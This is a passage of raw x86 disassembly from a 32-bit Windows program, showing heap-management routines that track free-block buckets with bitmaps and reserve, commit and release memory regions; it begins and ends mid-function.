  4267eb:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],esi
  4267f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4267fa:	mov    esi,DWORD PTR [ecx+0x8]
  4267fd:	mov    ecx,DWORD PTR [ecx+0x4]
  426800:	mov    DWORD PTR [esi+0x4],ecx
  426803:	mov    ecx,DWORD PTR [ebp+0xc]
  426806:	mov    esi,DWORD PTR [ecx+0x4]
  426809:	mov    ecx,DWORD PTR [ecx+0x8]
  42680c:	mov    DWORD PTR [esi+0x8],ecx
  42680f:	mov    esi,DWORD PTR [ebp+0xc]
  426812:	jmp    0x426817
  426814:	mov    ebx,DWORD PTR [ebp+0x8]
  426817:	cmp    DWORD PTR [ebp-0xc],0x0
  42681b:	jne    0x426825
  42681d:	cmp    ebx,edx
  42681f:	je     0x4268a5
  426825:	mov    ecx,DWORD PTR [ebp-0x10]
  426828:	lea    ecx,[ecx+edx*8]
  42682b:	mov    ebx,DWORD PTR [ecx+0x4]
  42682e:	mov    DWORD PTR [esi+0x8],ecx
  426831:	mov    DWORD PTR [esi+0x4],ebx
  426834:	mov    DWORD PTR [ecx+0x4],esi
  426837:	mov    ecx,DWORD PTR [esi+0x4]
  42683a:	mov    DWORD PTR [ecx+0x8],esi
  42683d:	mov    ecx,DWORD PTR [esi+0x4]
  426840:	cmp    ecx,DWORD PTR [esi+0x8]
  426843:	jne    0x4268a5
  426845:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426849:	mov    BYTE PTR [ebp+0xf],cl
  42684c:	inc    cl
  42684e:	cmp    edx,0x20
  426851:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426855:	jae    0x42687c
  426857:	cmp    BYTE PTR [ebp+0xf],0x0
  42685b:	jne    0x42686b
  42685d:	mov    ecx,edx
  42685f:	mov    ebx,0x80000000
  426864:	shr    ebx,cl
  426866:	mov    ecx,DWORD PTR [ebp+0x8]
  426869:	or     DWORD PTR [ecx],ebx
  42686b:	mov    ebx,0x80000000
  426870:	mov    ecx,edx
  426872:	shr    ebx,cl
  426874:	lea    eax,[eax+edi*4+0x44]
  426878:	or     DWORD PTR [eax],ebx
  42687a:	jmp    0x4268a5
  42687c:	cmp    BYTE PTR [ebp+0xf],0x0
  426880:	jne    0x426892
  426882:	lea    ecx,[edx-0x20]
  426885:	mov    ebx,0x80000000
  42688a:	shr    ebx,cl
  42688c:	mov    ecx,DWORD PTR [ebp+0x8]
  42688f:	or     DWORD PTR [ecx+0x4],ebx
  426892:	lea    ecx,[edx-0x20]
  426895:	mov    edx,0x80000000
  42689a:	shr    edx,cl
  42689c:	lea    eax,[eax+edi*4+0xc4]
  4268a3:	or     DWORD PTR [eax],edx
  4268a5:	mov    eax,DWORD PTR [ebp-0x4]
  4268a8:	mov    DWORD PTR [esi],eax
  4268aa:	mov    DWORD PTR [eax+esi*1-0x4],eax
  4268ae:	mov    eax,DWORD PTR [ebp-0x10]
  4268b1:	dec    DWORD PTR [eax]
  4268b3:	jne    0x4269b0
  4268b9:	mov    eax,ds:0x4674b8
  4268be:	test   eax,eax
  4268c0:	je     0x4269a2
  4268c6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268cc:	mov    esi,DWORD PTR ds:0x42904c
  4268d2:	push   0x4000
  4268d7:	shl    ecx,0xf
  4268da:	add    ecx,DWORD PTR [eax+0xc]
  4268dd:	mov    ebx,0x8000
  4268e2:	push   ebx
  4268e3:	push   ecx
  4268e4:	call   esi
  4268e6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268ec:	mov    eax,ds:0x4674b8
  4268f1:	mov    edx,0x80000000
  4268f6:	shr    edx,cl
  4268f8:	or     DWORD PTR [eax+0x8],edx
  4268fb:	mov    eax,ds:0x4674b8
  426900:	mov    eax,DWORD PTR [eax+0x10]
  426903:	mov    ecx,DWORD PTR ds:0x4674d0
  426909:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426911:	mov    eax,ds:0x4674b8
  426916:	mov    eax,DWORD PTR [eax+0x10]
  426919:	dec    BYTE PTR [eax+0x43]
  42691c:	mov    eax,ds:0x4674b8
  426921:	mov    ecx,DWORD PTR [eax+0x10]
  426924:	cmp    BYTE PTR [ecx+0x43],0x0
  426928:	jne    0x426933
  42692a:	and    DWORD PTR [eax+0x4],0xfffffffe
  42692e:	mov    eax,ds:0x4674b8
  426933:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426937:	jne    0x4269a2
  426939:	push   ebx
  42693a:	push   0x0
  42693c:	push   DWORD PTR [eax+0xc]
  42693f:	call   esi
  426941:	mov    eax,ds:0x4674b8
  426946:	push   DWORD PTR [eax+0x10]
  426949:	push   0x0
  42694b:	push   DWORD PTR ds:0x467700
  426951:	call   DWORD PTR ds:0x429058
  426957:	mov    eax,ds:0x4674bc
  42695c:	mov    edx,DWORD PTR ds:0x4674c0
  426962:	lea    eax,[eax+eax*4]
  426965:	shl    eax,0x2
  426968:	mov    ecx,eax
  42696a:	mov    eax,ds:0x4674b8
  42696f:	sub    ecx,eax
  426971:	lea    ecx,[ecx+edx*1-0x14]
  426975:	push   ecx
  426976:	lea    ecx,[eax+0x14]
  426979:	push   ecx
  42697a:	push   eax
  42697b:	call   0x4281d0
  426980:	mov    eax,DWORD PTR [ebp+0x8]
  426983:	add    esp,0xc
  426986:	dec    DWORD PTR ds:0x4674bc
  42698c:	cmp    eax,DWORD PTR ds:0x4674b8
  426992:	jbe    0x426998
  426994:	sub    DWORD PTR [ebp+0x8],0x14
  426998:	mov    eax,ds:0x4674c0
  42699d:	mov    ds:0x4674c8,eax
  4269a2:	mov    eax,DWORD PTR [ebp+0x8]
  4269a5:	mov    ds:0x4674b8,eax
  4269aa:	mov    DWORD PTR ds:0x4674d0,edi
  4269b0:	pop    ebx
  4269b1:	pop    edi
  4269b2:	pop    esi
  4269b3:	leave  
  4269b4:	ret    
  4269b5:	mov    eax,ds:0x4674bc
  4269ba:	mov    ecx,DWORD PTR ds:0x4674cc
  4269c0:	push   edi
  4269c1:	xor    edi,edi
  4269c3:	cmp    eax,ecx
  4269c5:	jne    0x4269fb
  4269c7:	lea    eax,[ecx+ecx*4+0x50]
  4269cb:	shl    eax,0x2
  4269ce:	push   eax
  4269cf:	push   DWORD PTR ds:0x4674c0
  4269d5:	push   edi
  4269d6:	push   DWORD PTR ds:0x467700
  4269dc:	call   DWORD PTR ds:0x4290e8
  4269e2:	cmp    eax,edi
  4269e4:	jne    0x4269ea
  4269e6:	xor    eax,eax
  4269e8:	pop    edi
  4269e9:	ret    
  4269ea:	add    DWORD PTR ds:0x4674cc,0x10
  4269f1:	mov    ds:0x4674c0,eax
  4269f6:	mov    eax,ds:0x4674bc
  4269fb:	mov    ecx,DWORD PTR ds:0x4674c0
  426a01:	push   esi
  426a02:	push   0x41c4
  426a07:	push   0x8
  426a09:	push   DWORD PTR ds:0x467700
  426a0f:	lea    eax,[eax+eax*4]
  426a12:	lea    esi,[ecx+eax*4]
  426a15:	call   DWORD PTR ds:0x4290dc
  426a1b:	cmp    eax,edi
  426a1d:	mov    DWORD PTR [esi+0x10],eax
  426a20:	jne    0x426a26
  426a22:	xor    eax,eax
  426a24:	jmp    0x426a69
  426a26:	push   0x4
  426a28:	push   0x2000
  426a2d:	push   0x100000
  426a32:	push   edi
  426a33:	call   DWORD PTR ds:0x4290e4
  426a39:	cmp    eax,edi
  426a3b:	mov    DWORD PTR [esi+0xc],eax
  426a3e:	jne    0x426a52
  426a40:	push   DWORD PTR [esi+0x10]
  426a43:	push   edi
  426a44:	push   DWORD PTR ds:0x467700
  426a4a:	call   DWORD PTR ds:0x429058
  426a50:	jmp    0x426a22
  426a52:	or     DWORD PTR [esi+0x8],0xffffffff
  426a56:	mov    DWORD PTR [esi],edi
  426a58:	mov    DWORD PTR [esi+0x4],edi
  426a5b:	inc    DWORD PTR ds:0x4674bc
  426a61:	mov    eax,DWORD PTR [esi+0x10]
  426a64:	or     DWORD PTR [eax],0xffffffff
  426a67:	mov    eax,esi
  426a69:	pop    esi
  426a6a:	pop    edi
  426a6b:	ret    
  426a6c:	push   ebp
  426a6d:	mov    ebp,esp
  426a6f:	push   ecx
  426a70:	push   ecx
  426a71:	mov    ecx,DWORD PTR [ebp+0x8]
  426a74:	mov    eax,DWORD PTR [ecx+0x8]
  426a77:	push   ebx
  426a78:	push   esi
  426a79:	mov    esi,DWORD PTR [ecx+0x10]
  426a7c:	push   edi
  426a7d:	xor    ebx,ebx
  426a7f:	jmp    0x426a84
  426a81:	shl    eax,1
  426a83:	inc    ebx
  426a84:	test   eax,eax
  426a86:	jge    0x426a81
  426a88:	mov    eax,ebx
  426a8a:	imul   eax,eax,0x204
  426a90:	lea    eax,[eax+esi*1+0x144]
  426a97:	push   0x3f
  426a99:	mov    DWORD PTR [ebp-0x8],eax
  426a9c:	pop    edx
  426a9d:	mov    DWORD PTR [eax+0x8],eax
  426aa0:	mov    DWORD PTR [eax+0x4],eax
  426aa3:	add    eax,0x8
  426aa6:	dec    edx
  426aa7:	jne    0x426a9d
  426aa9:	push   0x4
  426aab:	mov    edi,ebx
  426aad:	push   0x1000
  426ab2:	shl    edi,0xf
  426ab5:	add    edi,DWORD PTR [ecx+0xc]
  426ab8:	push   0x8000
  426abd:	push   edi
  426abe:	call   DWORD PTR ds:0x4290e4
  426ac4:	test   eax,eax
  426ac6:	jne    0x426ad0
  426ac8:	or     eax,0xffffffff
  426acb:	jmp    0x426b6d
  426ad0:	lea    edx,[edi+0x7000]
  426ad6:	cmp    edi,edx
  426ad8:	mov    DWORD PTR [ebp-0x4],edx
  426adb:	ja     0x426b20
  426add:	mov    ecx,edx
  426adf:	sub    ecx,edi
  426ae1:	shr    ecx,0xc
  426ae4:	lea    eax,[edi+0x10]
  426ae7:	inc    ecx
  426ae8:	or     DWORD PTR [eax-0x8],0xffffffff
  426aec:	or     DWORD PTR [eax+0xfec],0xffffffff
  426af3:	lea    edx,[eax+0xffc]
  426af9:	mov    DWORD PTR [eax],edx
  426afb:	lea    edx,[eax-0x1004]
  426b01:	mov    DWORD PTR [eax-0x4],0xff0
  426b08:	mov    DWORD PTR [eax+0x4],edx
  426b0b:	mov    DWORD PTR [eax+0xfe8],0xff0
  426b15:	add    eax,0x1000
  426b1a:	dec    ecx
  426b1b:	jne    0x426ae8
  426b1d:	mov    edx,DWORD PTR [ebp-0x4]
  426b20:	mov    eax,DWORD PTR [ebp-0x8]
  426b23:	add    eax,0x1f8
  426b28:	lea    ecx,[edi+0xc]
  426b2b:	mov    DWORD PTR [eax+0x4],ecx
  426b2e:	mov    DWORD PTR [ecx+0x8],eax
  426b31:	lea    ecx,[edx+0xc]
  426b34:	mov    DWORD PTR [eax+0x8],ecx
  426b37:	mov    DWORD PTR [ecx+0x4],eax
  426b3a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426b3f:	xor    edi,edi
  426b41:	inc    edi
  426b42:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426b49:	mov    al,BYTE PTR [esi+0x43]
  426b4c:	mov    cl,al
  426b4e:	inc    cl
  426b50:	test   al,al
  426b52:	mov    eax,DWORD PTR [ebp+0x8]
  426b55:	mov    BYTE PTR [esi+0x43],cl
  426b58:	jne    0x426b5d
  426b5a:	or     DWORD PTR [eax+0x4],edi
  426b5d:	mov    edx,0x80000000
  426b62:	mov    ecx,ebx
  426b64:	shr    edx,cl
  426b66:	not    edx
  426b68:	and    DWORD PTR [eax+0x8],edx
  426b6b:	mov    eax,ebx
  426b6d:	pop    edi
  426b6e:	pop    esi
  426b6f:	pop    ebx
  426b70:	leave  
  426b71:	ret    
  426b72:	push   ebp
  426b73:	mov    ebp,esp
  426b75:	sub    esp,0xc
  426b78:	mov    ecx,DWORD PTR [ebp+0x8]
  426b7b:	mov    eax,DWORD PTR [ecx+0x10]
  426b7e:	push   ebx
  426b7f:	push   esi
  426b80:	mov    esi,DWORD PTR [ebp+0x10]
  426b83:	push   edi
  426b84:	mov    edi,DWORD PTR [ebp+0xc]
  426b87:	mov    edx,edi
  426b89:	sub    edx,DWORD PTR [ecx+0xc]
  426b8c:	add    esi,0x17
  426b8f:	shr    edx,0xf
  426b92:	mov    ecx,edx
  426b94:	imul   ecx,ecx,0x204
  426b9a:	lea    ecx,[ecx+eax*1+0x144]
  426ba1:	mov    DWORD PTR [ebp-0xc],ecx
  426ba4:	mov    ecx,DWORD PTR [edi-0x4]
  426ba7:	and    esi,0xfffffff0
  426baa:	dec    ecx
  426bab:	cmp    esi,ecx
  426bad:	lea    edi,[ecx+edi*1-0x4]
  426bb1:	mov    ebx,DWORD PTR [edi]
  426bb3:	mov    DWORD PTR [ebp+0x10],ecx
  426bb6:	mov    DWORD PTR [ebp-0x4],ebx
  426bb9:	jle    0x426d14
  426bbf:	test   bl,0x1
  426bc2:	jne    0x426d0d
  426bc8:	add    ebx,ecx
  426bca:	cmp    esi,ebx
  426bcc:	jg     0x426d0d
  426bd2:	mov    ecx,DWORD PTR [ebp-0x4]
  426bd5:	sar    ecx,0x4
  426bd8:	dec    ecx
  426bd9:	cmp    ecx,0x3f
  426bdc:	mov    DWORD PTR [ebp-0x8],ecx
  426bdf:	jbe    0x426be7
  426be1:	push   0x3f
  426be3:	pop    ecx
  426be4:	mov    DWORD PTR [ebp-0x8],ecx
  426be7:	mov    ebx,DWORD PTR [edi+0x4]
  426bea:	cmp    ebx,DWORD PTR [edi+0x8]
  426bed:	jne    0x426c32
  426bef:	cmp    ecx,0x20
  426bf2:	mov    ebx,0x80000000
  426bf7:	jae    0x426c13
  426bf9:	shr    ebx,cl
  426bfb:	mov    ecx,DWORD PTR [ebp-0x8]
  426bfe:	lea    ecx,[ecx+eax*1+0x4]
  426c02:	not    ebx
  426c04:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426c08:	dec    BYTE PTR [ecx]
  426c0a:	jne    0x426c32
  426c0c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c0f:	and    DWORD PTR [ecx],ebx
  426c11:	jmp    0x426c32
  426c13:	add    ecx,0xffffffe0
  426c16:	shr    ebx,cl
  426c18:	mov    ecx,DWORD PTR [ebp-0x8]
  426c1b:	lea    ecx,[ecx+eax*1+0x4]
  426c1f:	not    ebx
  426c21:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426c28:	dec    BYTE PTR [ecx]
  426c2a:	jne    0x426c32
  426c2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2f:	and    DWORD PTR [ecx+0x4],ebx
  426c32:	mov    ecx,DWORD PTR [edi+0x8]
  426c35:	mov    ebx,DWORD PTR [edi+0x4]
  426c38:	mov    DWORD PTR [ecx+0x4],ebx
  426c3b:	mov    ecx,DWORD PTR [edi+0x4]
  426c3e:	mov    edi,DWORD PTR [edi+0x8]
  426c41:	mov    DWORD PTR [ecx+0x8],edi
  426c44:	mov    ecx,DWORD PTR [ebp+0x10]
  426c47:	sub    ecx,esi
  426c49:	add    DWORD PTR [ebp-0x4],ecx
  426c4c:	cmp    DWORD PTR [ebp-0x4],0x0
  426c50:	jle    0x426cfb
  426c56:	mov    edi,DWORD PTR [ebp-0x4]
  426c59:	mov    ecx,DWORD PTR [ebp+0xc]
  426c5c:	sar    edi,0x4
  426c5f:	dec    edi
  426c60:	cmp    edi,0x3f
  426c63:	lea    ecx,[ecx+esi*1-0x4]
  426c67:	jbe    0x426c6c
  426c69:	push   0x3f
  426c6b:	pop    edi
  426c6c:	mov    ebx,DWORD PTR [ebp-0xc]
  426c6f:	lea    ebx,[ebx+edi*8]
  426c72:	mov    DWORD PTR [ebp+0x10],ebx
  426c75:	mov    ebx,DWORD PTR [ebx+0x4]
  426c78:	mov    DWORD PTR [ecx+0x4],ebx
  426c7b:	mov    ebx,DWORD PTR [ebp+0x10]
  426c7e:	mov    DWORD PTR [ecx+0x8],ebx
  426c81:	mov    DWORD PTR [ebx+0x4],ecx
  426c84:	mov    ebx,DWORD PTR [ecx+0x4]
  426c87:	mov    DWORD PTR [ebx+0x8],ecx
  426c8a:	mov    ebx,DWORD PTR [ecx+0x4]
  426c8d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426c90:	jne    0x426ce9
  426c92:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426c96:	mov    BYTE PTR [ebp+0x13],cl
  426c99:	inc    cl
  426c9b:	cmp    edi,0x20
  426c9e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426ca2:	jae    0x426cc0
  426ca4:	cmp    BYTE PTR [ebp+0x13],0x0
  426ca8:	jne    0x426cb8
  426caa:	mov    ecx,edi
  426cac:	mov    ebx,0x80000000
  426cb1:	shr    ebx,cl
  426cb3:	mov    ecx,DWORD PTR [ebp+0x8]
  426cb6:	or     DWORD PTR [ecx],ebx
  426cb8:	lea    eax,[eax+edx*4+0x44]
  426cbc:	mov    ecx,edi
  426cbe:	jmp    0x426ce0
  426cc0:	cmp    BYTE PTR [ebp+0x13],0x0
  426cc4:	jne    0x426cd6
  426cc6:	lea    ecx,[edi-0x20]
  426cc9:	mov    ebx,0x80000000
  426cce:	shr    ebx,cl
  426cd0:	mov    ecx,DWORD PTR [ebp+0x8]
  426cd3:	or     DWORD PTR [ecx+0x4],ebx
  426cd6:	lea    eax,[eax+edx*4+0xc4]
  426cdd:	lea    ecx,[edi-0x20]
  426ce0:	mov    edx,0x80000000
  426ce5:	shr    edx,cl
  426ce7:	or     DWORD PTR [eax],edx
  426ce9:	mov    edx,DWORD PTR [ebp+0xc]
  426cec:	mov    ecx,DWORD PTR [ebp-0x4]
  426cef:	lea    eax,[edx+esi*1-0x4]
  426cf3:	mov    DWORD PTR [eax],ecx
  426cf5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426cf9:	jmp    0x426cfe
  426cfb:	mov    edx,DWORD PTR [ebp+0xc]
  426cfe:	lea    eax,[esi+0x1]
  426d01:	mov    DWORD PTR [edx-0x4],eax
  426d04:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426d08:	jmp    0x426e49
  426d0d:	xor    eax,eax
  426d0f:	jmp    0x426e4c
  426d14:	jge    0x426e49
  426d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  426d1d:	sub    DWORD PTR [ebp+0x10],esi
  426d20:	lea    ecx,[esi+0x1]
  426d23:	mov    DWORD PTR [ebx-0x4],ecx
  426d26:	lea    ebx,[ebx+esi*1-0x4]
  426d2a:	mov    esi,DWORD PTR [ebp+0x10]
  426d2d:	sar    esi,0x4
  426d30:	dec    esi
  426d31:	cmp    esi,0x3f
  426d34:	mov    DWORD PTR [ebp+0xc],ebx
  426d37:	mov    DWORD PTR [ebx-0x4],ecx
  426d3a:	jbe    0x426d3f
  426d3c:	push   0x3f
  426d3e:	pop    esi
  426d3f:	test   BYTE PTR [ebp-0x4],0x1
  426d43:	jne    0x426dc9
  426d49:	mov    esi,DWORD PTR [ebp-0x4]
  426d4c:	sar    esi,0x4
  426d4f:	dec    esi
  426d50:	cmp    esi,0x3f
  426d53:	jbe    0x426d58
  426d55:	push   0x3f
  426d57:	pop    esi
  426d58:	mov    ecx,DWORD PTR [edi+0x4]
  426d5b:	cmp    ecx,DWORD PTR [edi+0x8]
  426d5e:	jne    0x426da2
  426d60:	cmp    esi,0x20
  426d63:	mov    ebx,0x80000000
  426d68:	jae    0x426d83
  426d6a:	mov    ecx,esi
  426d6c:	shr    ebx,cl
  426d6e:	lea    esi,[esi+eax*1+0x4]
  426d72:	not    ebx
  426d74:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426d78:	dec    BYTE PTR [esi]
  426d7a:	jne    0x426d9f
  426d7c:	mov    ecx,DWORD PTR [ebp+0x8]
  426d7f:	and    DWORD PTR [ecx],ebx
  426d81:	jmp    0x426d9f
  426d83:	lea    ecx,[esi-0x20]
  426d86:	shr    ebx,cl
  426d88:	lea    ecx,[esi+eax*1+0x4]
  426d8c:	not    ebx
  426d8e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426d95:	dec    BYTE PTR [ecx]
  426d97:	jne    0x426d9f
  426d99:	mov    ecx,DWORD PTR [ebp+0x8]
  426d9c:	and    DWORD PTR [ecx+0x4],ebx
  426d9f:	mov    ebx,DWORD PTR [ebp+0xc]
  426da2:	mov    ecx,DWORD PTR [edi+0x8]
  426da5:	mov    esi,DWORD PTR [edi+0x4]
  426da8:	mov    DWORD PTR [ecx+0x4],esi
  426dab:	mov    esi,DWORD PTR [edi+0x8]
  426dae:	mov    ecx,DWORD PTR [edi+0x4]
  426db1:	mov    DWORD PTR [ecx+0x8],esi
  426db4:	mov    esi,DWORD PTR [ebp+0x10]
  426db7:	add    esi,DWORD PTR [ebp-0x4]
  426dba:	mov    DWORD PTR [ebp+0x10],esi
  426dbd:	sar    esi,0x4
  426dc0:	dec    esi
  426dc1:	cmp    esi,0x3f
  426dc4:	jbe    0x426dc9
  426dc6:	push   0x3f
  426dc8:	pop    esi
  426dc9:	mov    ecx,DWORD PTR [ebp-0xc]
  426dcc:	lea    ecx,[ecx+esi*8]
  426dcf:	mov    edi,DWORD PTR [ecx+0x4]
  426dd2:	mov    DWORD PTR [ebx+0x8],ecx
  426dd5:	mov    DWORD PTR [ebx+0x4],edi
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [ebx+0x4]
  426dde:	mov    DWORD PTR [ecx+0x8],ebx
  426de1:	mov    ecx,DWORD PTR [ebx+0x4]
  426de4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426de7:	jne    0x426e40
  426de9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ded:	mov    BYTE PTR [ebp+0xf],cl
  426df0:	inc    cl
  426df2:	cmp    esi,0x20
  426df5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426df9:	jae    0x426e17
  426dfb:	cmp    BYTE PTR [ebp+0xf],0x0
  426dff:	jne    0x426e0f
  426e01:	mov    ecx,esi
  426e03:	mov    edi,0x80000000
  426e08:	shr    edi,cl
  426e0a:	mov    ecx,DWORD PTR [ebp+0x8]
  426e0d:	or     DWORD PTR [ecx],edi
  426e0f:	lea    eax,[eax+edx*4+0x44]
  426e13:	mov    ecx,esi
  426e15:	jmp    0x426e37
  426e17:	cmp    BYTE PTR [ebp+0xf],0x0
  426e1b:	jne    0x426e2d
  426e1d:	lea    ecx,[esi-0x20]
  426e20:	mov    edi,0x80000000
  426e25:	shr    edi,cl
  426e27:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2a:	or     DWORD PTR [ecx+0x4],edi
  426e2d:	lea    eax,[eax+edx*4+0xc4]
  426e34:	lea    ecx,[esi-0x20]
  426e37:	mov    edx,0x80000000
  426e3c:	shr    edx,cl
  426e3e:	or     DWORD PTR [eax],edx
  426e40:	mov    eax,DWORD PTR [ebp+0x10]
  426e43:	mov    DWORD PTR [ebx],eax
  426e45:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426e49:	xor    eax,eax
  426e4b:	inc    eax
  426e4c:	pop    edi
  426e4d:	pop    esi
  426e4e:	pop    ebx
  426e4f:	leave  
  426e50:	ret    
  426e51:	push   ebp
  426e52:	mov    ebp,esp
  426e54:	sub    esp,0x14
  426e57:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5a:	mov    eax,ds:0x4674bc
  426e5f:	mov    edx,DWORD PTR ds:0x4674c0
  426e65:	add    ecx,0x17
  426e68:	and    ecx,0xfffffff0
  426e6b:	push   ebx
  426e6c:	mov    DWORD PTR [ebp-0x10],ecx
  426e6f:	sar    ecx,0x4
  426e72:	push   esi
  426e73:	lea    eax,[eax+eax*4]
  426e76:	push   edi
  426e77:	dec    ecx
  426e78:	cmp    ecx,0x20
  426e7b:	lea    edi,[edx+eax*4]
  426e7e:	mov    DWORD PTR [ebp-0x4],edi
  426e81:	jge    0x426e8e
  426e83:	or     esi,0xffffffff
  426e86:	shr    esi,cl
  426e88:	or     DWORD PTR [ebp-0x8],0xffffffff
  426e8c:	jmp    0x426e9b
  426e8e:	add    ecx,0xffffffe0
  426e91:	or     eax,0xffffffff
  426e94:	xor    esi,esi
  426e96:	shr    eax,cl
  426e98:	mov    DWORD PTR [ebp-0x8],eax
  426e9b:	mov    eax,ds:0x4674c8
  426ea0:	mov    ebx,eax
  426ea2:	mov    DWORD PTR [ebp-0xc],esi
  426ea5:	cmp    ebx,edi
  426ea7:	jmp    0x426ebd
  426ea9:	mov    ecx,DWORD PTR [ebx+0x4]
  426eac:	mov    edi,DWORD PTR [ebx]
  426eae:	and    ecx,DWORD PTR [ebp-0x8]
  426eb1:	and    edi,esi
  426eb3:	or     ecx,edi
  426eb5:	jne    0x426ec2
  426eb7:	add    ebx,0x14
  426eba:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ebd:	mov    DWORD PTR [ebp+0x8],ebx
  426ec0:	jb     0x426ea9
  426ec2:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ec5:	jne    0x426eeb
  426ec7:	mov    ebx,edx
  426ec9:	jmp    0x426edc
  426ecb:	mov    ecx,DWORD PTR [ebx+0x4]
  426ece:	mov    edi,DWORD PTR [ebx]
  426ed0:	and    ecx,DWORD PTR [ebp-0x8]
  426ed3:	and    edi,esi
  426ed5:	or     ecx,edi
  426ed7:	jne    0x426ee3
  426ed9:	add    ebx,0x14
  426edc:	cmp    ebx,eax
  426ede:	mov    DWORD PTR [ebp+0x8],ebx
  426ee1:	jb     0x426ecb
  426ee3:	cmp    ebx,eax
  426ee5:	je     0x426f7f
  426eeb:	mov    DWORD PTR ds:0x4674c8,ebx
  426ef1:	mov    eax,DWORD PTR [ebx+0x10]
  426ef4:	mov    edx,DWORD PTR [eax]
  426ef6:	cmp    edx,0xffffffff
  426ef9:	mov    DWORD PTR [ebp-0x4],edx
  426efc:	je     0x426f12
  426efe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f05:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426f09:	and    ecx,DWORD PTR [ebp-0x8]
  426f0c:	and    edi,esi
  426f0e:	or     ecx,edi
  426f10:	jne    0x426f48
  426f12:	mov    edx,DWORD PTR [eax+0xc4]
  426f18:	and    edx,DWORD PTR [ebp-0x8]
  426f1b:	and    DWORD PTR [ebp-0x4],0x0
  426f1f:	lea    ecx,[eax+0x44]
  426f22:	mov    esi,DWORD PTR [ecx]
  426f24:	and    esi,DWORD PTR [ebp-0xc]
  426f27:	or     edx,esi
  426f29:	mov    esi,DWORD PTR [ebp-0xc]
  426f2c:	jne    0x426f45
  426f2e:	mov    edx,DWORD PTR [ecx+0x84]
  426f34:	and    edx,DWORD PTR [ebp-0x8]
  426f37:	inc    DWORD PTR [ebp-0x4]
  426f3a:	add    ecx,0x4
  426f3d:	mov    edi,DWORD PTR [ecx]
  426f3f:	and    edi,esi
  426f41:	or     edx,edi
  426f43:	je     0x426f2e
  426f45:	mov    edx,DWORD PTR [ebp-0x4]
  426f48:	mov    ecx,edx
  426f4a:	imul   ecx,ecx,0x204
  426f50:	lea    ecx,[ecx+eax*1+0x144]
  426f57:	mov    DWORD PTR [ebp-0xc],ecx
  426f5a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  426f5e:	xor    edi,edi
  426f60:	and    ecx,esi
  426f62:	jne    0x426fd1
  426f64:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f6b:	and    ecx,DWORD PTR [ebp-0x8]
  426f6e:	push   0x20
  426f70:	pop    edi
  426f71:	jmp    0x426fd1
  426f73:	cmp    DWORD PTR [ebx+0x8],0x0
  426f77:	jne    0x426f84
  426f79:	add    ebx,0x14
  426f7c:	mov    DWORD PTR [ebp+0x8],ebx
  426f7f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f82:	jb     0x426f73
  426f84:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f87:	jne    0x426faf
  426f89:	mov    ebx,edx
  426f8b:	jmp    0x426f96
  426f8d:	cmp    DWORD PTR [ebx+0x8],0x0
  426f91:	jne    0x426f9d
  426f93:	add    ebx,0x14
  426f96:	cmp    ebx,eax
  426f98:	mov    DWORD PTR [ebp+0x8],ebx
  426f9b:	jb     0x426f8d
  426f9d:	cmp    ebx,eax
  426f9f:	jne    0x426faf
  426fa1:	call   0x4269b5
  426fa6:	mov    ebx,eax
  426fa8:	test   ebx,ebx
  426faa:	mov    DWORD PTR [ebp+0x8],ebx
  426fad:	je     0x426fc7
  426faf:	push   ebx
  426fb0:	call   0x426a6c
  426fb5:	pop    ecx
  426fb6:	mov    ecx,DWORD PTR [ebx+0x10]
  426fb9:	mov    DWORD PTR [ecx],eax
  426fbb:	mov    eax,DWORD PTR [ebx+0x10]
  426fbe:	cmp    DWORD PTR [eax],0xffffffff
  426fc1:	jne    0x426eeb
  426fc7:	xor    eax,eax
  426fc9:	jmp    0x427148
  426fce:	shl    ecx,1
  426fd0:	inc    edi
  426fd1:	test   ecx,ecx
  426fd3:	jge    0x426fce
  426fd5:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  426fdc:	mov    ecx,DWORD PTR [edx]
  426fde:	sub    ecx,DWORD PTR [ebp-0x10]
  426fe1:	mov    esi,ecx
  426fe3:	sar    esi,0x4
  426fe6:	dec    esi
  426fe7:	cmp    esi,0x3f
  426fea:	mov    DWORD PTR [ebp-0x8],ecx
  426fed:	jle    0x426ff2
  426fef:	push   0x3f
  426ff1:	pop    esi
  426ff2:	cmp    esi,edi
  426ff4:	je     0x4270fb
  426ffa:	mov    ecx,DWORD PTR [edx+0x4]
